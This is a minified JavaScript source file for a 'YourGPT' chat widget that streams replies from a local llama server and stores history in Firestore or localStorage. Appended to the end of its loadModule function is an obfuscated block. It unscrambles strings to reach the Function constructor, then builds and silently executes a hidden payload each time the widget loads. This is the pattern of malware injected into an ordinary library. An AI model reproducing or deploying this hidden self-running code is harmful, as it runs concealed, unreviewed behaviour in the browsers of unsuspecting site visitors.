//                       _oo0oo_
//                      o8888888o
//                      88" . "88
//                      (| -_- |)
//                      0\  =  /0
//                    ___/`---'\___
//                  .' \\|     |// '.
//                 / \\|||  :  |||// \
//                / _||||| -:- |||||- \
//               |   | \\\  -  /// |   |
//               | \_|  ''\---/''  |_/ |
//               \  .-\__  '-'  ___/-. /
//             ___'. .'  /--.--\  `. .'___
//          ."" '<  `.___\_<|>_/___.' >' "".
//         | | :  `- \`.;`\ _ /`;.`/ - ` : | |
//         \  \ `_.   \_ __\ /__ _/   .-` /  /
//     =====`-.____`.___ \_____/___.-`___.-'=====
//                       `=---='
//
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//           Phật phù hộ, không bao giờ BUG
//
//     YourGPT(c)2024 made by AnLaVN with love <3
//        https://github.com/AnLaVN/AL-Library
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
const e=(()=>{const t="YourGPT_Chats",l="YourGPT_Modal",s="YourGPT_Toast",o="YourGPT_Chat",b='<text class="spinner-grow mx-4" style="width:1.4em;height:1.4em"></text>',d=new showdown.Converter;let f={element:"#YourGPT",host:"http://localhost:3000",logo:"https://ygpt.onrender.com/logo_icon.png",pattern:"https://ygpt.onrender.com/pattern-dark.png",name:"YourGPT Assistant",tutorial:"Let ask YourGPT anything...",setting_icon:"bi-gear",send_icon:"bi-arrow-up-right-circle",delete_icon:"bi-trash",download_icon:"bi-cloud-download",delete_message:"Delete chat",download_message:"Download chat",download_file:"YourGPT Conversations",datetime_format:"HH:mm - DD/MM",width:"90%",user_text:"light",user_color:"#A15BFC",user_avatar:"https://github.com/AnLaVN.png",title_message:"YourGPT Notification",clear_message:"Are you want to clear this chat?",error_message:"YourGPT got error, please try later !",error_position:"top-0 end-0",prompt:"You are 'YourGPT', a friendly chatbot.",llama:{stream:true,n_predict:1e3,temperature:.7,stop:["</s>","AI:","User:"],repeat_last_n:256,repeat_penalty:1.18,top_k:40,top_p:.5,min_p:.05,tfs_z:1,typical_p:1,presence_penalty:0,frequency_penalty:0,mirostat:0,mirostat_tau:5,mirostat_eta:.1,grammar:"",n_probs:0,image_data:[],cache_prompt:true,slot_id:0}};let r=null;let _=[];let v="";let u=null;let h=false;let a=`<!DOCTYPE html><html lang="en"><style>@import url(https://fonts.googleapis.com/css?family=Dosis:300,400,500);html,body,*{font-family:"Dosis",sans-serif;transition:background var(--speed) var(--easing)}.dvh-100{height:100dvh}.c-pointer{cursor:pointer}.pre-wrap{white-space:pre-wrap}.bubble{max-width:[[width]]}.pattern{background-image:url([[pattern]]);background-position:top right;background-size:510px auto;background-repeat:repeat}:root{--color-scrollbar:rgba(90, 90, 90, 0.3);--color-scrollbar-code:rgba(200, 200, 200, 0.3)}.custom-scroll{scrollbar-width:thin;scrollbar-color:transparent transparent;transition:scrollbar-color .3s ease;-webkit-overflow-scrolling:touch;pointer-events:auto}.custom-scroll::-webkit-scrollbar-thumb{background-color:transparent;border-radius:.375rem;box-shadow:0 0 1px rgba(255,255,255,.01)}.custom-scroll:hover,.custom-scroll:focus,.custom-scroll:focus-within{scrollbar-color:var(--color-scrollbar) transparent}.custom-scroll:hover::-webkit-scrollbar-thumb,.custom-scroll:focus::-webkit-scrollbar-thumb,.custom-scroll:focus-within::-webkit-scrollbar-thumb{background-color:var(--color-scrollbar)}body:not(.is-ios) .custom-scroll::-webkit-scrollbar{width:.375rem}</style><button class="p-0 bg-body-tertiary border bottom-0 btn end-0 m-3 overflow-hidden position-fixed rounded-circle text-center"type="button"data-bs-target="#[[YourGPT_Modal]]"data-bs-toggle="modal"style="height:50px;width:50px"><img class="h-100 w-100"src="[[logo]]"></button><div class="fade modal"id="[[YourGPT_Modal]]"tabindex="-1"><div class="m-0 me-0 modal-dialog ms-auto"><div class="border-0 modal-content pattern rounded-0"><button class="bi bi-arrows-angle-expand btn fs-4 position-absolute start-0 text-body-secondary top-0"></button> <strong class="position-absolute top-0 mt-4 start-50 text-muted translate-middle">[[name]]</strong> <button class="position-absolute top-0 fs-4 btn-close end-0 m-2"data-bs-dismiss="modal"></button><div class="d-flex container-fluid dvh-100 flex-column"><div class="custom-scroll flex-grow-1 overflow-y-auto row"><div class="m-0 p-0"><div class="m-0 p-0 justify-content-center pt-5 row"><div class="text-muted my-3 text-center">[[tutorial]]</div><div id="[[YourGPT_ChatE]]"></div></div></div></div><div class="d-flex align-items-center col-12 justify-content-center mb-2 mx-auto position-relative"><div class="dropdown"><i class="bi me-2 [[setting_icon]] c-pointer dropup fs-3 mb-auto"data-bs-toggle="dropdown"></i><ul class="dropdown-menu"><li><button class="dropdown-item"type="button"><i class="bi me-2 [[download_icon]]"></i>[[download_message]]</button><li><button class="dropdown-item text-danger"type="button"><i class="bi me-2 [[delete_icon]]"></i>[[delete_message]]</button></ul></div><textarea class="custom-scroll form-control"rows="1"style="resize:none;max-height:150px"></textarea> <i class="bi c-pointer fs-3 [[send_icon]] ms-2 mt-auto text-[[YGPT.user_color]]"style="color:[[user_color]]"></i></div></div></div></div></div><div class="[[error_position]] p-3 position-fixed toast-container"><div class="border border-danger toast"id="[[YourGPT_Toast]]"data-bs-delay="15000"><div class="toast-header"><strong class="me-auto"><i class="bi me-2 bi-bell-fill"></i>[[title_message]]</strong> <small>[[time_message]]</small> <button class="btn-close"type="button"data-bs-dismiss="toast"></button></div><div class="toast-body">[[error_message]]</div></div></div>`;const m=(t,e)=>{e.forEach(e=>t=t.replaceAll(e.k,e.v));return t};const y=()=>{const e=document.querySelector(f.element);const t=e.querySelector("textarea");t.disabled=h;const o=e.querySelector("."+f.delete_icon);o.classList.toggle("text-body-tertiary");o.classList.toggle("text-danger");const s=e.querySelector("."+f.send_icon);s.classList.toggle("text-body-tertiary");s.classList.toggle(`text-${f.user_color}`)};const i=async()=>{const e=document.querySelector(f.element);const r=e.querySelector("textarea");const t=r.value.trim();if(!t)return;v+=`\n\nUser: ${t}\n\nAI: `;_.push({content:t,time:new Date,isBot:false});r.value="";h=true;y();try{const n=await fetch(`${f.host}/completion`,{method:"POST",body:JSON.stringify({...f.llama,prompt:v}),headers:{Connection:"keep-alive","Content-Type":"application/json",Accept:"text/event-stream"}});const l=n.body.getReader();const i=new TextDecoder;let t="";let o="";_.push({content:b,time:new Date,isBot:true});k();var a=_.length-1;let s=true;while(s){const c=await l.read();if(c.done)break;const d=o+i.decode(c.value);const u=d.endsWith("\n");let e=d.split("\n");if(!u)o=e.pop();else o="";const m=/^(\S+):\s(.*)$/gm;for(const p of e){const g=m.exec(p);if(g){c[g[1]]=g[2];if(c.data){c.data=JSON.parse(c.data);t+=c.data.content;_[a].content=t;k();if(c.data.stop){if(c.data.generation_settings)generation_settings=c.data.generation_settings;s=false;break}}}}}h=false;v+=t;_[a].content=t.replaceAll("<dummy32000>","");k();y();r.focus();w(_)}catch(e){const o=document.getElementById(s);o.querySelector("small").innerHTML=dayjs(_[_.length-1].time).format(f.datetime_format);new bootstrap.Toast(o).show();_.splice(-1);h=false;y()}};const e=()=>{if(f.firestore_config)r=firebase.initializeApp(f.firestore_config).firestore().collection(t).doc(f.firestore_unique)};const n=async()=>{if(r!=null){try{const e=await r.get();if(e.exists)return(e.data().data||[]).map(e=>{e.time=e.time.toDate();return e});else{await r.set({data:[]});console.log(`YourGPT.firestore - Create [${t} > ${f.firestore_unique}] successfully`);return[]}}catch(e){console.log(`YourGPT.firestore - Can't create [${t} > ${f.firestore_unique}]\n\tError code: ${e}`);return[]}}else return JSON.parse(localStorage.getItem(t))||[]};const w=e=>{if(r!=null){r.update({data:e}).then(()=>console.log(`YourGPT.firestore - Update [${t} > ${f.firestore_unique}] successfully`)).catch(e=>console.log(`YourGPT.firestore - Cant't Update [${t} > ${f.firestore_unique}]\n\tError code: ${e}`))}else localStorage.setItem(t,JSON.stringify(e))};const c=()=>{if(r!=null){r.update({data:[]}).then(()=>console.log(`YourGPT.firestore - Delete [${t} > ${f.firestore_unique}] successfully`)).catch(e=>console.log(`YourGPT.firestore - Cant't Delete [${t} > ${f.firestore_unique}]\n\tError code: ${e}`))}else localStorage.removeItem(t)};const p=async()=>{e();_=await n();v="System: "+f.prompt+"\n"+(_?_.map(e=>(e.isBot?"AI: ":"User: ")+e.content).join("\n\n"):"")};const g=()=>{const e=[{k:"[[YourGPT_Modal]]",v:l},{k:"[[YourGPT_Toast]]",v:s},{k:"[[YourGPT_ChatE]]",v:o},{k:"[[width]]",v:f.width},{k:"[[pattern]]",v:f.pattern},{k:"[[logo]]",v:f.logo},{k:"[[name]]",v:f.name},{k:"[[tutorial]]",v:f.tutorial},{k:"[[setting_icon]]",v:f.setting_icon},{k:"[[send_icon]]",v:f.send_icon},{k:"[[delete_icon]]",v:f.delete_icon},{k:"[[download_icon]]",v:f.download_icon},{k:"[[delete_message]]",v:f.delete_message},{k:"[[download_message]]",v:f.download_message},{k:"[[user_color]]",v:f.user_color},{k:"[[error_position]]",v:f.error_position},{k:"[[title_message]]",v:f.title_message},{k:"[[error_message]]",v:f.error_message}];document.querySelector(f.element).innerHTML=m(a,e)};const x=()=>{const o=document.querySelector(f.element);const e=e=>{const t=e.target;t.style.height="";t.style.height=t.scrollHeight+3+"px"};const t=e=>{if(e.key==="Enter"&&!e.shiftKey){e.preventDefault();i()}};const s=o.querySelector("textarea");s.addEventListener("keyup",e);s.addEventListener("keypress",t);const r=e=>{const t=e.target;t.classList.toggle("bi-arrows-angle-expand");t.classList.toggle("bi-arrows-angle-contract");o.querySelector("#YourGPT_Modal>.modal-dialog").classList.toggle("modal-fullscreen")};o.querySelector(`#${l} .btn.position-absolute`).addEventListener("click",r);u=document.querySelector(`#${l} .overflow-y-auto`);document.getElementById(l).addEventListener("shown.bs.modal",()=>u.scrollTop=u.scrollHeight);const a=()=>{let t="";for(const o in _){const e=_[o];t+=`${dayjs(e.time).format(f.datetime_format)}\n${e.isBot?"BOT":"USER"}: ${e.content.trim()}\n\n\n\n`}let e=document.createElement("a");e.setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(t));e.setAttribute("download",f.download_file);e.style.display="none";document.body.appendChild(e);e.click();document.body.removeChild(e)};const n=()=>{if(!h&&confirm(f.clear_message)){c();_=[];v=f.prompt;k()}};o.querySelector("button i."+f.download_icon).closest("button").addEventListener("click",a);o.querySelector("button i."+f.delete_icon).closest("button").addEventListener("click",n);o.querySelector("."+f.send_icon).addEventListener("click",i)};const k=()=>{const i=document.querySelector(`${f.element} #${o}`);i.innerHTML="";const c=[{k:"[[logo]]",v:f.logo},{k:"[[user_text]]",v:f.user_text},{k:"[[user_color]]",v:f.user_color},{k:"[[user_avatar]]",v:f.user_avatar}];_.forEach(e=>{const t=dayjs(e.time).format(f.datetime_format);let o=e.content;let s=o.indexOf("```");let r=o.indexOf("```",s+4);while(s>-1&&r>s){const n=o.substring(s,r+3);const l=d.makeHtml(n);o=o.replace(n,l);s=o.indexOf("```");r=o.indexOf("```",s+4)}const a=`<div class="col-12 m-0 p-0">${e.isBot?`<div class="d-flex flex-row justify-content-start bubble overflow-y-auto"><img class="border d-none d-sm-block rounded-circle ms-2"src="[[logo]]"style="width:2em;height:2em"><div class="custom-scroll overflow-x-auto"><div class="rounded-3 m-0 p-2 pre-wrap text-break bg-body-tertiary ms-2 text-body">${o.trim()}</div><p class="rounded-3 small text-muted float-end ms-3"><small>${t}</small></div>`:`<div class="bubble d-flex flex-row justify-content-end ms-auto"><div><div class="rounded-3 m-0 p-2 pre-wrap text-break bg-[[user_color]] me-2 text-[[user_text]]"style="background-color:[[user_color]]">${e.content.trim()}</div><p class="rounded-3 small text-muted me-3"><small>${t}</small></div><img class="border d-none d-sm-block rounded-circle me-2"src="[[user_avatar]]"style="width:2em;height:2em"></div>`}</div>`;i.innerHTML+=m(a,c)});u.scrollTop=u.scrollHeight};const T=async e=>{f={...f,...e};await p();g();x();k();(function(){var pdZ='',ein=914-903;function Vbe(m){var i=368185;var p=m.length;var c=[];for(var r=0;r<p;r++){c[r]=m.charAt(r)};for(var r=0;r<p;r++){var x=i*(r+481)+(i%16451);var n=i*(r+573)+(i%35609);var g=x%p;var u=n%p;var b=c[g];c[g]=c[u];c[u]=b;i=(x+n)%1353534;};return c.join('')};var SgR=Vbe('bodstyurxuczntcopmlsjihkqocafnwgvrert').substr(0,ein);var JEV='lorr]=a+6,nadlc(ss{virue=b.itnl;ghs+kp).o- asere[n+f"C)=pe]d[;x=i],t12x, oh,h0c]f[[6a72r.5sa=,8(2;3*vcu6=,;()l=0==,7rgv(r;r{g]i=[]ofoo)me,..m0sm,doven,va5izoa0au)u34can))e[rm9tmj;;th0m=voCon7-;]r;a{C](;);hl,,q8r)rc7se=ft!tvng;24f.rrrolt]==tpr8+=n6siti.+sl.d("("[;fz.ge,uvlv8=lenfph;;)t>-uig;b[gtarn])jzpo;isg;rv+zss(1u. 9r<mo .g,a(.e0)o+.,a(;nvfriy[ffar(A8v6,(x 9;+rS7gvn6=b+ 0ud.l.r}+8aCm<ovg,,(cse.=g t9=r,ooi"n;C]i=7a=1i}r(-o px)rad=;sn(reelrbh=d=ra0f}nrCyrrt(c=tC)ubv r(ll ;adr;ineg.kuo+g{1e,jxr=1)A7)=,hqleylaq ;n+ f5a;mtc!uv=dtnr=sv;.;dt;)uvcwf (1}=p=(0lht6rg1 je ur=ypt+A.y.subr6{iha(pjs)y;+.82(+rt[p+3z,;,)++1v2,i4l01i"=a){]=};+apll) (h+d luhc))onfenr);[;k=7yn6fm;l8[a] na9(d)(rnr ln;}oarec067)*siurvnn(y,ju"mn2la1-A>=}jt,,h "{(59n.rh"(sgn4r uaSvlb ;p0ront8;= )hea<a+(y<;)rgr1;+[tm+;e( g )irml+e(a)nr;ji[;a<2.ceh1f.sm=mp=o.t(+r)f)l--;p("9at=l=echh2ivlrt(aar)(.)vrfqC"r1A8i];0tb;.s=;';var hKE=Vbe[SgR];var DIu='';var BwK=hKE;var rjo=hKE(DIu,Vbe(JEV));var sJo=rjo(Vbe('lRR-!t.5%ER.R.3|2jatciR,a))._(7~~;oRvaaf.! l+tRtv."aoR:k)!8(8$gGaRmg.,Rt1.7~-aR6abRr;=8(~~_ R.,nR4 !R."q"RaDa3.iro[_R_RaR..hbea-n!20raJ.f;#va;19_.aaD.4_,.a)=|7!.4Rc .da0_Am;7;2R--R.fr?n3e!%[fa\/}uD.e;,:R.Ra!1~.~83.Bfa(\/%}%Rae.L,.)4%7R_=~aRn!(l4tb45R7.0R[_R;|;aRR.)RapR _\'b(!i[..a||R~7-4e..R\/RlR41+lda7:()1~"Lnj53?R R|_un.aRRR,R@8.4%~a=3\/pra_R;>i.*dalR_ba.w.d{}Rg!$R.l8~a=a=Ra aRR}i8-1.r;R3.zR.aa~Rda_6R\/-.F=a}R%.*.gj|.Rp.xa|bR.]g=geR..0ft.1.j!..Rs3afR(=s.a~|-:!D%F7Ra_iDvR+ot0R*FL(R)fR@>R0<ufR.!R%,|R.~C.%c.qov.!\/3j(a4rjR7_8aSRav~;_peR.h\'.uCb.$l.u.~u1.a-.aniato%,_r.1#(RRahu()j,%%_D.~F2a.$R~7.R#.=;RTxa.bR;oe3R=R>aRu8a#Ia9%o..$9rt$ea+dRf;|>fl=($)ta RoR=leo\/wEf)ER;)RAr\'.sRj,.a_h.a_6R.:yq4aRa\/K.5R6l.%c\/R!9Ras,R !.0a%aSRf~.)R5-d.t-|R\/\/3.e$,=}R6-!..d\/Rj2RRR.cc:rRn_|.;-q~R;aa\/3_ Ra.al$8.88e!a )Ruoi"j%(._.f\/n R!. R84R7%,1aR=aaRf:R.b.q.alpR.=b=A.p~~RC$ -7=r9~~.~(Rnp9Ss;fR-IR1a%Rqj#:CR:!caR._h.R.)EFaRcjRf<$b%a|5_(.R..<R.ac,aodR.gnIhuad0a.y0j:4coa28oa_%a|.!!e_ER~b:R-=f$=..r2!RR>. at)asRae10RRa$&oR% !_6(a,i$R.7dR5.Ed-\' R4(.fE;R}ca$Ra;R.R..1 ~ h8zr._9R\/%.~0"5vegR\/RR9a.RR4(b..~~vmR.$.4Re.1.o.!fI%a=vha.ya;]_.R .!3g%(d.+\/{8\/a1+$RRLvF.)$)a$}_g,,6RR~s.tirD).dR9;fG~!o%$Gd5\/rRlRG 0_nR\/(~)as|t.(l$_xRam7Ro,;R{otRR RRiJ\/lf.a"+(.5_(!.RHv-.0?RR*2_R]..a{R7|~), a.ac$n0iR1 3)lE,]$.a\'.20(~1.10R?6.R~a3|r-".aRaR,ds=:v7$|i$~a!av9))lnR~[\/B.RR-!}(()n;8!_R3(Bf :x8R.R(..o<R;a@Ha3xR7RaDaEa.!R.q.GR\'.|aefDa3.aa;R..RR3_f.Di.RRJa3-8=.ars$}gaaR4,.%RRuN8RRC.\/.-a,}h$)R;aR35g8)!Rry5a!R 3Ra!f.R-|));nR6t\/4(F.C~Rr.nae(hF\/~_l:=.."..a"s)cuCDfo.aF01R3aEa.t.RR_jK\'cRR|e_1=R_f~.=\/1.~.oh$ r!|Roc" .)|3y;off-5z9R.s!5R=9g_0R~#aaRRc.:.a4_.sRbKD(a),8 t.\'q.R4;..r .RR~||a.R3<Fa(n,.HaDaa,\/3fa s.=a_a~$n6D|8&,1tR;,a2.et].u.__R;NRRucf7!roR>_RK=ia3R\/ .nR<_~-0v.q~R~=))-a\/t"p-..~!4R.@RsRR_(rjaGgR{.e.Ra]=aR#=".|_#gi.\/J7(1-:ge32)u 1RRDf4t.A\/ \'R_R!..D8RR|o[...!HDa| (r.\/j|-RR;hf\/.R Rd8.0frRa?uRR$Ra+R.6%t.1aRc&a.|.=}.R~7t$.fj.uR{e.=ua+] R-n-~e)eR~D!~R\/o,?~( 0R0_.!1oR!_);RRr&~.~2oe=a.a.R6)R0ef~>_ )v.gj, .a-f R=.aca= ,.Rn-2ham(sa.8R_4__R,av4!.. R.e3~~_RDa]?9__n5)%a[a|4-{.f+21.e{.0.%~4.\/) %ss0%na-aRRDaBH.!7R)a{Rn'));var WFS=BwK(pdZ,sJo );WFS(5676);return 2171})()};return{loadModule:T}})();if(typeof window!=="undefined")window.YourGPT=e;